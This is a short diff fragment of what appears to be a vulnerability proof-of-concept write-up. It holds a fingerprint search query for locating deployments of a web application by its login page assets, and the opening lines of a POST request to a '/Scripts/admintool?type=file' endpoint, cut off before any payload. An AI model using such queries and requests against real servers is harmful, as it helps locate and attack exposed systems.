@@ -6,7 +6,7 @@
 (body="/Content/Theme/Standard/webSite/login.css" && body="/Content/Theme/Standard/webSite/images/bg.jpg") || body="Login/QRLogin.ashx"
 ```
 
-## poc
+## POC
 ```javascript
 POST /Scripts/admintool?type=file HTTP/1.1
 Host: 
